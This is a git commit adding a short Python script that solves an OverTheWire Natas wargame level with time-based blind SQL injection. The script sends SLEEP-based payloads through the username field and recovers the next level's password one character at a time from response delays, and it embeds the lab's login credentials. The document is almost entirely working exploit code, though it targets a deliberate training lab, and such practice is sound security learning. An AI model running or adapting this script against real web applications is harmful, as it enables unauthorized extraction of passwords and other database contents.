f4c08bdbf8d6d30ee0ca0037cd5041fa677eea39
davidoberst <juandavidbustosperez82@gmail.com>
2026-02-19 12:41:47 -0500

    Time-based-Blind-SQL-Injection

---
+++ Time-based-Blind-SQL-Injection.py
@@ -0,0 +1,24 @@
+#Blind SQL Injection (real time)
+
+import requests
+import string
+url = "http://natas17.natas.labs.overthewire.org/"
+chars = string.ascii_letters + string.digits
+password = ""
+
+for x in range(32):
+    for y in chars:
+        payload = f"natas18\" AND IF(password LIKE BINARY '{password + y}%', SLEEP(5), 1) #"
+        url_params = {
+        "username": payload
+        }     
+        httpresponse = requests.post(url, params=url_params,auth=("natas17","EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")) 
+             
+        if httpresponse.elapsed.total_seconds() >= 5:  #blind real time sql timeline server request
+            password += y
+            print(password)
+            break
+
+
+
+
